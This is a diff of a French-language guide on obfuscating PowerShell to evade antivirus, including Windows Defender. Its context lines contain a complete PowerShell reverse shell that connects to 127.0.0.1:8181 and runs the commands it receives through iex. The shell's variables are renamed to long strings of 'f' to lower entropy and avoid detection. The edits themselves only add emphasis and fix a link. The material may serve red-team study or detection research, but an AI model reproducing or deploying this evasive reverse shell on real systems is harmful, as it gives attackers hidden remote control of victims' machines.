@@ -20,7 +20,7 @@ On peut également le faire à la main en regardant les erreurs.
 
 ## __Rename Objects__
 
-Il est important de renommer le nom de nos variables en respectant le concept de [Entropie](PowerShell_Obfuscation.md#__Entropie__), cela rend le travail plus difficile pour les antivirus.
+Il est **important de renommer** le nom de **nos variables** en respectant le concept de [Entropie](PowerShell_Obfuscation.md#__Entropie__), cela rend le travail plus difficile pour les antivirus.
 
 Voici un code détecté par les antivirus classique dont windows defender :
 
@@ -38,9 +38,9 @@ On peut également remplacer le nom des variables par x * 'f', ce qui donnerai q
 $ffffffffffffffffffffffffffffffff = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181); $fffffffffffffffffffff = $ffffffffffffffffffffffffffffffff.GetStream(); [byte[]] $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = 0..65535|%{0}; while(($ffffffffffffffffffffffffffffffffffffffffffffffffffffff = $fffffffffffffffffffff.Read($ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, 0, $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff.Length)) -ne 0){; $fffff = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,0, $ffffffffffffffffffffffffffffffffffffffffffffffffffffff); $b396f8bb13ec47c28e4f721085e95361 = (iex $fffff 2>&1 | Out-String ); $fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff= ([text.encoding]::ASCII).GetBytes($fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff); $fffffffffffffffffffff.Write($ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,0, $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff.Length);$fffffffffffffffffffff.Flush()}; $ffffffffffffffffffffffffffffffff.Close()
 ```
 
-Cela donnera une entropie bien inférieur à celle précédente et a probablement de meilleur chance face au Antivirus.
+Cela donnera une **entropie bien inférieur** à celle précédente et a **probablement de meilleur chance** face au Antivirus.
 
-Pour modifier automatiquement le nom des variables [voir scripts]().
+Pour **modifier automatiquement** le nom des variables [voir scripts](PowerShell_Obfuscation##__Scripts__###Edit_variables_names).
 
 
 ## __Scripts__
